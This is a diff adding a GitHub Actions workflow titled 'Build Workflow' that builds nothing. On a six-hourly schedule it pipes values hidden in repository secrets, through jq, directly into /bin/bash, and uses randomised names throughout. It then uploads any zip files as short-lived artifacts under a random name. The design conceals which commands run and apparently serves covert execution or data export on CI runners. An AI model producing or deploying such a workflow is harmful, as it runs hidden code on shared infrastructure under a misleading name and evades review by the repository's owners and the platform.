@@ -1,0 +1,30 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '39 2,8,14,20 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  start:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute task
+        env:
+          zmvcu06: ${{ secrets.zmvcu06 }}
+        run: |
+          printf '%s' "$zmvcu06" | jq -r .ticko276 | /bin/bash
+          echo $proq71048 | jq -r .wyw65250 | /bin/bash
+          printf '%s' "$jque17" | jq -r .kt4045 | /bin/bash
+          printf '%s' "$br57" | jq -r .e90445 | /bin/bash
+
+      - name: Persist data
+        if: ${{ always() }}
+        uses: actions/upload-artifact@v4
+        with:
+          name: eb5VUALR
+          path: "*.zip"
+          retention-days: 1
